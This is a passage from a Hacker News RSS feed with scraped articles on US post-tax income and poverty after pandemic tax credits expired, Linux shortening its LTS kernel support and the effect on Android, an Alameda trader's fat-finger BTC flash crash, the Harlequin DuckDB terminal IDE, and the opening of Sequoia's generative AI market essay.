<p>In 2022, several policies enacted by the <a href="https://www.whitehouse.gov/american-rescue-plan/" target="_blank">American Rescue Plan Act (ARPA)</a> expired, including an expansion of the <a href="https://www.irs.gov/newsroom/changes-to-the-earned-income-tax-credit-for-the-2022-filing-season" target="_blank">Earned Income Tax Credit (EITC)</a> for filers without children and full refundability of the <a href="https://www.irs.gov/credits-deductions/2021-child-tax-credit-and-advance-child-tax-credit-payments-topic-c-calculation-of-the-2021-child-tax-credit" target="_blank">Child Tax Credit (CTC)</a> and <a href="https://www.irs.gov/newsroom/child-and-dependent-care-credit-faqs" target="_blank">Child and Dependent Care Tax Credit (CDCTC)</a>. ARPA also increased the maximum amount of CTC.</p>
<p>In 2020 and 2021, most households also received <a href="https://home.treasury.gov/policy-issues/coronavirus/assistance-for-american-families-and-workers/economic-impact-payments" target="_blank">Economic Impact Payments (EIP)</a> that were no longer issued in 2022.</p>
<p>The rollback of these tax policies had the largest effect on post-tax income among the nation’s lowest-income households.</p>
<p>In 2021, for example, post-tax income at the 10th percentile, meaning at the bottom of the income distribution, was 17.1% <i>higher</i> than the corresponding pretax income estimate, reflecting the substantial boost that lower-income households received that year from the EIP and expanded CTC.</p>
<p>In contrast, the 2022 estimates of pretax and post-tax income at the 10th percentile were not significantly different (Figure 1).</p>
<p>Lower post-tax income, particularly at the bottom of the income distribution, also resulted in an increase in income inequality.</p>
<p>The Gini index, a common measure of how spread out or unequal incomes are, for pretax income was 1.2% lower in 2022 than in 2021, reflecting real income declines at the top of the income distribution. However, the post-tax Gini index was 3.2% higher due to substantial declines in post-tax income among lower-income households.</p>

</div><div id="textcore-44a48ec46d">
    <p>The decline in post-tax income also corresponds to an increase in the SPM, which incorporates noncash government assistance programs like the Supplemental Nutritional Assistance Program (SNAP) and taxes, through income and payroll taxes and refundable tax credits like the CTC and EITC. &nbsp;</p>
<p>The 4.6 percentage point increase in the SPM poverty rate was driven almost entirely by the change in tax policy (Figure 2). &nbsp;When a version of the SPM excluding taxes is examined, the poverty rate did not change: 12.6% in 2022, not statistically different from 2021.</p>

</div><div id="textcore-a1e0b57298">
    <p>The expiration of expansions to refundable tax credits had a particularly important impact on SPM poverty (Figure 3).</p>
<p>In 2021, 9.6 million people were kept out of poverty due to refundable tax credits. This number declined to 6.4 million in 2022 as the pandemic era expansions expired. The effect declined for each of the major age groups, with 3.5 million children lifted out of poverty in 2022 compared to 4.9 million in 2021.</p>

</div><div id="textcore-efa5988a95">
    <p>More information on Income and Poverty is available in the reports <a href="https://www.census.gov/library/publications/2023/demo/p60-279.html">Income in the United States: 2022</a> and <a href="https://www.census.gov/library/publications/2023/demo/p60-280.html">Poverty in the United States: 2022</a></p>
<p>The technical documentation page includes information on confidentiality protection, methodology, sampling and nonsampling error, and definitions. All comparative statements in this report have undergone statistical testing, and, unless otherwise noted, all comparisons are statistically significant at the 90 percent significance level.<a href="https://www.census.gov/programs-surveys/cps/technical-documentation/complete.html"></a></p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux gives up on 6-year LTS kernels, says they’re too much work (222 pts)]]></title>
            <link>https://arstechnica.com/gadgets/2023/09/linux-gives-up-on-6-year-lts-thats-fine-for-pcs-bad-for-android/</link>
            <guid>37591050</guid>
            <pubDate>Wed, 20 Sep 2023 22:36:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2023/09/linux-gives-up-on-6-year-lts-thats-fine-for-pcs-bad-for-android/">https://arstechnica.com/gadgets/2023/09/linux-gives-up-on-6-year-lts-thats-fine-for-pcs-bad-for-android/</a>, See on <a href="https://news.ycombinator.com/item?id=37591050">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <header>
            <h4>
      Pay maintainers!    —
</h4>
            
            <h2 itemprop="description">Linux's six-year long-term support was meant to help embedded devices.</h2>
                    </header>
        <div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2013/09/linux-penguin.jpg" alt="Linux gives up on 6-year LTS kernels, says they’re too much work">
      <figcaption></figcaption>  </figure>

  




<!-- cache hit 202:single/related:eef60434b7d501121954ccdc70832942 --><!-- empty -->
<p>The LTS (long-term support) period for the Linux kernel is being cut down. <a href="https://arstechnica.com/gadgets/2017/09/android-users-rejoice-linux-kernel-lts-releases-are-now-good-for-6-years/">In 2017</a>, the kernel jumped from two years of support to six. Now, six years later, it turns out that's a lot of work. <a href="https://www.zdnet.com/article/long-term-support-for-linux-kernel-to-be-cut-as-maintainence-remains-under-strain/">ZDNet</a> reports that at the Open Source Summit Europe this week (videos will be out in a few weeks), <a href="https://lwn.net/">Linux Weekly News</a> executive editor Jonathan Corbet announced the Linux kernel will return to two years of LTS support.</p>
<p>The plan to cut back down to two years isn't instant. The Linux community is still honoring the <a href="https://www.kernel.org/category/releases.html">current end-of-life timelines</a>, so 6.1, 5.15, 5.10, 5.4, 4.19, and 4.14 are still six years, but new kernels will only get two years. Even this six-year window was supposed to be an optional thing when it started, with the release page FAQ saying, "Each new longterm kernel usually starts with only a 2-year projected EOL that can be extended further if there is enough interest from the industry at large to help support it for a longer period of time." The reality was that everything received a six-year life span, and now that will no longer be the case.</p>
<p>Corbet cited a mix of lack of use and a lack of support for why Linux is cutting back on LTS kernels. Corbet says, "There's really no point to maintaining [old kernels] for that long because people are not using them." The other big problem is the burnout from maintainers, which are often unpaid and could use a lot more support from the billion-dollar companies that benefit from using Linux.</p>                                            
                                                        
<h2>But what about Android?</h2>
<p>Two years seems like a fine support window for PCs, but what about Android? The original LTS extension was mainly made with Android and Internet of Things devices in mind—it was announced during an Android Linux talk by Google developer Iliyan Malchev. The problem was that on PCs, two years only represents the time between kernel <em>updates</em>, so that's a fine timeline. Embedded devices tend not to update the kernel, though, so those "two years" represent most of the development cycle and the entire consumer support window, and that's not long enough.</p>
  <div>
    <ul>
              <li data-thumb="https://cdn.arstechnica.net/wp-content/uploads/2017/09/40-1-150x150.jpg" data-src="https://cdn.arstechnica.net/wp-content/uploads/2017/09/40-1.jpg" data-responsive="https://cdn.arstechnica.net/wp-content/uploads/2017/09/40-1-980x537.jpg 1080, https://cdn.arstechnica.net/wp-content/uploads/2017/09/40-1-1440x789.jpg 2560" data-sub-html="#caption-1177141">
          <figure>
            
                          <figcaption id="caption-1177141">
                <span></span>
                                  <p>
                    Google's LTS slide from 2017. With only two years of Linux kernel support (the blue bar), the kernel's support window is almost over by the time an Android device is developed and ready to ship.                   </p>
                                                  
                              </figcaption>
                      </figure>
        </li>
              <li data-thumb="https://cdn.arstechnica.net/wp-content/uploads/2017/09/39-150x150.jpg" data-src="https://cdn.arstechnica.net/wp-content/uploads/2017/09/39.jpg" data-responsive="https://cdn.arstechnica.net/wp-content/uploads/2017/09/39-980x537.jpg 1080, https://cdn.arstechnica.net/wp-content/uploads/2017/09/39-1440x789.jpg 2560" data-sub-html="#caption-1177099">
          <figure>
            
                          <figcaption id="caption-1177099">
                <span></span>
                                  <p>
                    With six years of support, there's plenty of support time for device development <em>and</em> the product's ownership life cycle.                  </p>
                                                  
                              </figcaption>
                      </figure>
        </li>
          </ul>
  </div>

<p>The original picture Google painted in 2017 was that phones take two years to be developed and that the kernel is locked in near the beginning of the engineering process. The LTS kernel would be hitting end-of-life right around when the phone finally shipped, and customers would use obsolete kernels for the lifetime of their devices. The Android kernel development process is a whole pile of forks: First, Google forks from a new Linux LTS to make the "Android Common" kernel, then that is sent to SoC vendors like Qualcomm and forked for each model of SoC, then <em>that</em> fork is sent to device makers, which fork it again for each model of device. It takes a while.</p>
<p>Are things better in 2023? I don't know about that. The Android kernel docs have a Linux "<a href="https://source.android.com/docs/core/architecture/kernel/android-common#compatibility-matrix">compatibility matrix</a>" for each version of Android, and Android 14—releasing any day now—still supports launching new devices with Linux 5.4, a 4-year-old kernel. That's going to <em>start</em> a new window of support, remember, so even with a paltry two years of ownership, that's a six-year-old kernel. That's also just for new devices. You can upgrade to Android 14 from Linux 4.14, which goes back to 2017. You can see how Google arrived at the six-year number. It's hard to know what every cheap Android phone is doing at any given time, but I assume these are all supported because they are still needed.</p>                                            
                                                        
<p>There are also smartwatches to consider, where things are even worse. The Pixel Watch is so ashamed of its Linux kernel that it's not even listed in the settings, but the device launched in 2022 with <a href="https://twitter.com/MishaalRahman/status/1580695517763276800/photo/1">Linux kernel 4.19</a>, a 4-year-old kernel at the time.</p>
<figure><img alt="Android's GKI has a bunch of modules for hardware support that you can plug into the kernel. " src="https://cdn.arstechnica.net/wp-content/uploads/2023/09/generic-kernel-image-architecture.png" width="740" height="395"><figcaption><p>Android's GKI has a bunch of modules for hardware support that you can plug into the kernel. </p><p>Google</p></figcaption></figure>
<p>Android's big advancement since 2017 is <a href="https://arstechnica.com/gadgets/2021/11/android-12-the-ars-technica-review/3/">the GKI</a>, Google's "Generic Kernel Image," which cuts down on the "fork of a fork of a fork" Android kernel development process. That first fork, Android Common, adds all the Android compatibility stuff to Linux, so that still happens with the GKI, but fork No. 2 and 3 are for hardware compatibility, and the GKI instead moves those to modules. Further out, there is a plan to move to <a href="https://arstechnica.com/gadgets/2021/09/android-to-take-an-upstream-first-development-model-for-the-linux-kernel/">mainline Linux.&nbsp;</a></p>
<p>Even GKI phones still don't do major kernel updates, though. You get minor LTS security updates, but the Pixel 6, the first GKI phone, launched with Linux 5.10 and is still on Linux 5.10. That's a 3-year-old kernel. If this trend keeps up, when it gets its last security update in 2027, it will have a 7-year-old kernel. Google <a href="https://arstechnica.com/gadgets/2020/09/the-android-11-interview-googlers-answer-our-burning-questions/2/">has said</a> before that major GKI kernel updates are in the plans eventually. There's even mention of <a href="https://source.android.com/docs/core/architecture/kernel/gki-faq">major kernel swaps</a> in the documents, but the landmark of updating a production consumer device to a major new GKI version is not something that has happened yet. <a href="https://9to5google.com/2023/08/28/google-pixel-8-android-os-updates/">Rumor has it</a> that the Pixel 8 will have a longer support window, so maybe we'll see major kernel updates launch with that phone.</p>

                                                </div>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Alameda lost tens of millions because of a fat fingering mistake (214 pts)]]></title>
            <link>https://www.adityabaradwaj.com/part-2-the-fat-finger/</link>
            <guid>37590544</guid>
            <pubDate>Wed, 20 Sep 2023 21:35:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.adityabaradwaj.com/part-2-the-fat-finger/">https://www.adityabaradwaj.com/part-2-the-fat-finger/</a>, See on <a href="https://news.ycombinator.com/item?id=37590544">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

    

    <div>
        <p>OR</p><p>The story of how a misplaced decimal point at Alameda Research caused a market crash that echoed around the world.</p><p>This incident happened just a few weeks after I joined Alameda. I had just gotten a hang of our engineering workflows and was starting to wrap my head around our trading systems.At a high level, Alameda's trading operated in two modes:</p><p>The main one was our semi-systematic strategies, where traders set model parameters that control a complex automated trading system. This way, traders aren't placing actual trades, but rather fine-tuning an algorithm that decides how to execute those trades at high frequency.</p><p>However every once in a while, a trader would need to manually execute a trade. Usually this might happen if our automated trading systems were being buggy due to market volatility, or if there was an arbitrage opportunity on a venue where we hadn't set up automated trading yet.</p><p>Our automated trading systems handled the vast majority of Alameda's trading. So naturally, we had sanity checks in place to make sure that the orders being sent were reasonable relative to current market prices. Not so for manual trades, which were by nature discretionary.</p><p>The tricky thing about risk is that it's usually invisible, right up until it comes around and bites you in the ass.</p><p>Well, on October 21 2021, an Alameda trader's finger slipped.</p><p>The trader was trying to sell a block of BTC in response to news, and sent out the order via our manual trading system. What they missed was the decimal point was off by a few spaces. Rather than selling BTC at the current market price, they sold it for pennies on the dollar.</p><p>The result was immediate. The price of BTC shot from a high of $65k to as low as $8k on some venues, only to be quickly restored by arbitrageurs.</p><p>The sudden price movement lit crypto Twitter on fire as traders scrambled to figure out what was going on:</p><figure><img src="https://www.adityabaradwaj.com/content/images/2023/09/bitcoin-flash-crash-twitter-collage.png" alt="" loading="lazy" width="2000" height="1429" srcset="https://www.adityabaradwaj.com/content/images/size/w600/2023/09/bitcoin-flash-crash-twitter-collage.png 600w, https://www.adityabaradwaj.com/content/images/size/w1000/2023/09/bitcoin-flash-crash-twitter-collage.png 1000w, https://www.adityabaradwaj.com/content/images/size/w1600/2023/09/bitcoin-flash-crash-twitter-collage.png 1600w, https://www.adityabaradwaj.com/content/images/2023/09/bitcoin-flash-crash-twitter-collage.png 2100w" sizes="(min-width: 720px) 720px"><figcaption>A snapshot of crypto Twitter that day</figcaption></figure><p>News outlets started picking up too. Binance US - which was the epicenter of the flash crash - released a statement claiming that it had been caused by one of their "institutional traders" who had a "bug in their trading algorithm".</p><p>I guess Caroline had made some phone calls.</p><figure><img src="https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.26.42.png" alt="" loading="lazy" width="1840" height="1902" srcset="https://www.adityabaradwaj.com/content/images/size/w600/2023/09/Screenshot-2023-09-19-at-21.26.42.png 600w, https://www.adityabaradwaj.com/content/images/size/w1000/2023/09/Screenshot-2023-09-19-at-21.26.42.png 1000w, https://www.adityabaradwaj.com/content/images/size/w1600/2023/09/Screenshot-2023-09-19-at-21.26.42.png 1600w, https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.26.42.png 1840w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.26.57.png" alt="" loading="lazy" width="2000" height="1788" srcset="https://www.adityabaradwaj.com/content/images/size/w600/2023/09/Screenshot-2023-09-19-at-21.26.57.png 600w, https://www.adityabaradwaj.com/content/images/size/w1000/2023/09/Screenshot-2023-09-19-at-21.26.57.png 1000w, https://www.adityabaradwaj.com/content/images/size/w1600/2023/09/Screenshot-2023-09-19-at-21.26.57.png 1600w, https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.26.57.png 2072w" sizes="(min-width: 720px) 720px"></figure><p>Alameda's losses on the fat-finger trade were staggering - on the order of tens of millions. But because it had been an honest mistake, there wasn't much to do except to implement additional sanity checks for manual trades. And that's what we did.</p><p>That's usually how things worked at Alameda - we would wait until something broke, and then rush to fix it. Which is why it took us so long to implement sanity checks that any "traditional" trading firm would have never started trading without.</p><p>After that, it was back to business as usual. According to SBF, the utility we gained by moving fast outweighed the occasional costs we paid due to poor risk checks, hacks, and the like. This was SBF's work philosophy, and it drove the culture he created at Alameda and FTX</p><p>For almost two years, the BTC flash crash incident has remained a mystery in the minds of the public. Now you know who was responsible, and what was happening behind the scenes.</p><figure><img src="https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.06.36.png" alt="" loading="lazy" width="1204" height="234" srcset="https://www.adityabaradwaj.com/content/images/size/w600/2023/09/Screenshot-2023-09-19-at-21.06.36.png 600w, https://www.adityabaradwaj.com/content/images/size/w1000/2023/09/Screenshot-2023-09-19-at-21.06.36.png 1000w, https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.06.36.png 1204w" sizes="(min-width: 720px) 720px"></figure><p>Liked this post? If so, drop a reply on the <a href="https://twitter.com/aditya_baradwaj/status/1704546813817024907?ref=adityabaradwaj.com">Twitter thread</a> with what you want to hear about next!</p>
    </div>

    

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Harlequin: DuckDB IDE for the terminal (280 pts)]]></title>
            <link>https://harlequin.sh/</link>
            <guid>37588526</guid>
            <pubDate>Wed, 20 Sep 2023 19:02:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://harlequin.sh/">https://harlequin.sh/</a>, See on <a href="https://news.ycombinator.com/item?id=37588526">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><nav><div> <p><span> <span>The DuckDB IDE for Your Terminal.</span></span></p></div>  </nav> <main><h2 data-svelte-h="svelte-1ltg9s5">Portable, powerful, colorful.</h2> <p data-svelte-h="svelte-zeyac5">A drop-in replacement for the DuckDB CLI.</p>  <img src="https://harlequin.sh/_app/immutable/assets/monokai.20be51a1.svg" alt="A screenshot showing the interface and features of Harlequin."> <h2 data-svelte-h="svelte-6dpwsj">Runs Anywhere.</h2> <p data-svelte-h="svelte-uggzqi">Any shell, any terminal, any machine. Fish in tmux on Alpine over SSH? Sure.
  Windows cmd? Yep.</p> <ul><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li><li> </li></ul> <h2 data-svelte-h="svelte-1uj5341">Does SQL IDE Stuff.</h2> <p data-svelte-h="svelte-1stw158">The features you'd expect from an IDE, delightfully running right in your
  terminal.</p> <ul><li><div><h3>Data Catalog</h3> <p>View tables, columns, and their types across one or more attached databases.</p></div></li> <li><div><h3>Query Editor</h3> <p>A full-featured editor: open, save, format, cut, copy, paste, and more. Supports multiple tabbed buffers!</p></div></li> <li><div><h3>Results Viewer</h3> <p>View up to 10k results in an interactive table. Multiple queries loaded into separate tabs.</p></div></li> <li><div><h3>MotherDuck Support</h3> <p>Connect to any MotherDuck database in local or SaaS mode.</p></div></li> <li><div><h3>Full Screen</h3> <p>Need more room? Press F10 to view the Editor or Results in full-screen mode.</p></div></li> <li><div><h3>Results Export</h3> <p>Export query results and configure the export using a helpful UI.</p></div></li></ul> <h2 id="themes" data-svelte-h="svelte-wztx5h">Looks nice.</h2> <p data-svelte-h="svelte-19zxe54">Choose from dozens of <a href="https://pygments.org/styles/" target="_blank">styles</a>.</p> <ul><li><a href="https://harlequin.sh/_app/immutable/assets/arduino.6cb6ba6e.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/dracula.7331770a.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/emacs.258e2d03.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/fruity.e5c651ae.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/github-dark.3e595acd.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/gruvbox-dark.c57ea619.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/gruvbox-light.8fcc9b1b.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/igor.332eecf4.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/inkpot.1988cc50.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/lightbulb.c7f31036.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/material.beb7eff9.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/monokai.20be51a1.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/native.763b291d.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/nord-darker.621bb21a.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/one-dark.0db2542f.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/perldoc.e2d8296c.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/rrt.4aef9e0f.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/solarized-dark.48668f70.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/solarized-light.961cc9c2.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/stata-dark.abda9dcd.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/vs.01c66e70.svg" target="_blank"></a> </li><li><a href="https://harlequin.sh/_app/immutable/assets/zenburn.82aeeebe.svg" target="_blank"></a> </li></ul> <h2 data-svelte-h="svelte-1ehpzy">Join the Flock.</h2> <p data-svelte-h="svelte-10r3db">Thousands are using Harlequin. Join them with <code>pipx install harlequin</code>.</p> <ul><li> </li><li> </li><li> </li></ul></main> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Generative AI's Act Two (101 pts)]]></title>
            <link>https://www.sequoiacap.com/article/generative-ai-act-two/</link>
            <guid>37588520</guid>
            <pubDate>Wed, 20 Sep 2023 19:02:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sequoiacap.com/article/generative-ai-act-two/">https://www.sequoiacap.com/article/generative-ai-act-two/</a>, See on <a href="https://news.ycombinator.com/item?id=37588520">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
		<article>
	
<section data-color-mode="dark"><video id="hero_featured-video" loop="" muted="" playsinline=""><source data-id="15641" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/genai-act2-hero.mp4" type="video/mp4"></video><div data-grid-columns="2"><div>


<p><span>
Animation: James Buckhouse, Midjourney and Runway</span>


<time datetime="2023-09-20T07:00:00-07:00">
Published September 20, 2023</time>
</p></div><div><p>One year ago, we published a hypothesis that generative AI would become a profound platform shift in technology. Then came the firestorm.</p></div></div></section>



<section>
<p>Scientists, historians and economists have long studied the optimal conditions that create a Cambrian explosion of innovation. In generative AI, we have reached a modern marvel, our generation’s space race.</p>



<p>This moment has been decades in the making. Six decades of Moore’s Law has given us the compute horsepower to process exaflops of data. Four decades of the internet (accelerated by COVID) has given us trillions of tokens’ worth of training data. Two decades of mobile and cloud computing has given every human a supercomputer in the palm of our hands. In other words, decades of technological progress have accumulated to create the necessary conditions for generative AI to take flight.</p>



<p>ChatGPT’s rise was the spark that lit the fuse, unleashing a density and fervor of innovation that we have not seen in years—perhaps since the early days of the internet. The breathless excitement was especially visceral in “Cerebral Valley,” where AI researchers reached rockstar status and hacker houses were filled to the brim each weekend with new autonomous agents and companionship chatbots. AI researchers transformed from the proverbial “hacker in the garage” to special forces units commanding billions of dollars of compute. The arXiv printing press has become so prolific that researchers have jokingly called for a pause on new publications so they can catch up.</p>



<p>But quickly, AI excitement turned to borderline hysteria. Suddenly, every company was an “AI copilot.” Our inboxes got filled up with undifferentiated pitches for “AI Salesforce” and “AI Adobe” and “AI Instagram.” The $100M pre-product seed round returned. We found ourselves in an unsustainable feeding frenzy of fundraising, talent wars and GPU procurement.&nbsp;</p>



<p>And sure enough, the cracks started to show. Artists and writers and singers challenged the legitimacy of machine-generated IP. Debates over ethics, regulation and looming superintelligence consumed Washington. And perhaps most worryingly, a whisper began to spread within Silicon Valley that generative AI was not actually useful. The products were falling far short of expectations, as evidenced by terrible user retention. End user demand began to plateau for many applications. Was this just another vaporware cycle?</p>



<p>The AI summer of discontent has sent critics gleefully grave dancing, reminiscent of the early days of the internet, where in 1998 one famous economist declared “By 2005, it will become clear that the Internet’s impact on the economy has been no greater than the fax machine’s.”</p>



<p>Make no mistake—despite the noise and the hysteria and the air of uncertainty and discontent,&nbsp; generative AI has already had a more successful start than SaaS, with &gt;$1 billion in revenue from startups alone (it took the SaaS market years, not months, to reach the same scale). Some applications have become household names: ChatGPT became the fastest-growing application with particularly strong product-market fit among students and developers; Midjourney became our collective creative muse and was reported to have reached hundreds of millions of dollars in revenue with a team of just eleven; and Character popularized AI entertainment and companionship and created the consumer “social” application we craved the most—with users spending two hours on average in-app.</p>



<p>Nonetheless, these early signs of success don’t change the reality that a lot of AI companies simply do not have product-market fit or a sustainable competitive advantage, and that the overall ebullience of the AI ecosystem is unsustainable.</p>



<p>Now that the dust has settled for a bit, we thought it would be an opportune moment to zoom out and reflect on generative AI—where we find ourselves today, and where we’re possibly headed.&nbsp;</p>



<h2 id="h-towards-act-two">Towards Act Two</h2>



<p>Generative AI’s first year out the gate—“Act 1”—came from the <em>technology-out</em>. We discovered a new “hammer”—foundation models—and unleashed a wave of novelty apps that were lightweight demonstrations of cool new technology.&nbsp;</p>



<p>We now believe the market is entering “Act 2”—which will be from the <em>customer-back</em>. Act 2 will solve human problems end-to-end. These applications are different in nature than the first apps out of the gate. They tend to use foundation models as a piece of a more comprehensive solution rather than the entire solution. They introduce new editing interfaces, making the workflows stickier and the outputs better. They are often multi-modal.</p>



<p>The market is already beginning to transition from “Act 1” to “Act 2.” Examples of companies entering “Act 2” include <a href="http://harvey.ai/">Harvey</a>, which is building custom LLMs for elite law firms; <a href="http://glean.com/">Glean</a>, which is crawling and indexing our workspaces to make Generative AI more relevant at work; and <a href="http://character.ai/">Character</a> and <a href="https://apps.apple.com/us/app/ava-your-digital-friend/id6446257579">Ava</a>, which are creating digital companions.&nbsp;</p>



<h2 id="h-market-map">Market Map</h2>



<p>Our updated generative AI market map is below.&nbsp;</p>



<p>Unlike last year’s map, we have chosen to organize this map by use case rather than by model modality. This reflects two important thrusts in the market: Generative AI’s evolution from technology hammer to actual use cases and value, and the increasingly multimodal nature of generative AI applications.</p>
</section>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png" alt="" width="1200" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png 2160w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=225,300 225w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=768,1024 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=1152,1536 1152w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=1536,2048 1536w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=113,150 113w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=1920,2560 1920w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=680,907 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=930,1240 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=1440,1920 1440w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-market-map.png?resize=480,640 480w" sizes="(max-width: 2160px) 100vw, 2160px"></figure>



<section>
<p>In addition, we have included a new LLM developer stack that reflects the compute and tooling vendors that companies are turning to as they build generative AI applications in production.</p>
</section>



<figure><img decoding="async" src="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png" alt="" width="1200" srcset="https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png 2160w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=225,300 225w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=768,1024 768w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=1152,1536 1152w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=1536,2048 1536w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=113,150 113w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=1920,2560 1920w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=680,907 680w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=930,1240 930w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=1440,1920 1440w, https://www.sequoiacap.com/wp-content/uploads/sites/6/2023/09/generative-ai-model-stack.png?resize=480,640 480w" sizes="(max-width: 2160px) 100vw, 2160px"></figure>



<section>
<h2>Revisiting Our Thesis</h2>



<p>Our original <a href="https://www.sequoiacap.com/article/generative-ai-a-creative-new-world/">essay</a> laid out a thesis for the generative AI market opportunity and a hypothesis for how the market would unfold. How did we do?</p>



<p>Here’s what we got wrong:</p>



<ol>
<li><strong>Things happened quickly.</strong> Last year, we anticipated it would be nearly a decade before we had intern-level code generation, Hollywood-quality videos or human quality speech that didn’t sound mechanical. But a quick listen to Eleven Labs’ voices on TikTok or Runway’s AI film festival makes it clear that the future has arrived at warp speed. Even 3D models, gaming and music are becoming good, <em>quickly</em>.&nbsp;</li>



<li><strong>The bottleneck is on the supply side. </strong>We did not anticipate the extent to which end user demand would outstrip GPU supply. The bottleneck to many companies’ growth quickly became not customer demand but access to the latest GPUs from Nvidia. Long wait times became the norm, and a simple business model emerged: pay a subscription fee to skip the line and access better models.&nbsp;</li>



<li><strong>Vertical separation hasn’t happened yet</strong>. We still believe that there will be a separation between the “application layer” companies and foundation model providers, with model companies specializing in scale and research and application layer companies specializing in product and UI. In reality, that separation hasn’t cleanly happened yet. In fact, the most successful user-facing applications out of the gate have been vertically integrated.</li>



<li><strong>Cutthroat competitive environment and swiftness of the incumbent response.</strong> Last year, there were a few overcrowded categories of the competitive landscape (notably image generation and copywriting), but by and large the market was whitespace. Today, many corners of the competitive landscape have more competition than opportunity. The swiftness of the incumbent response, from Google’s Duet and Bard to Adobe’s Firefly—and the willingness of incumbents to finally go “risk on”—has magnified the competitive heat. Even in the foundation model layer, we are seeing customers set up their infrastructure to be agnostic between different vendors.&nbsp;</li>



<li><strong>The moats are in the customers, not the data. </strong>We predicted that the best generative AI companies could generate a sustainable competitive advantage through a data flywheel: more usage → more data → better model → more usage. While this is still somewhat true, especially in domains with very specialized and hard-to-get data, the “data moats” are on shaky ground: the data that application companies generate does not create an insurmountable moat, and the next generations of foundation models may very well obliterate any data moats that startups generate. Rather, <em>workflows</em> and <em>user networks</em> seem to be creating more durable sources of competitive advantage.</li>
</ol>



<p>Here’s what we got right:</p>



<ol>
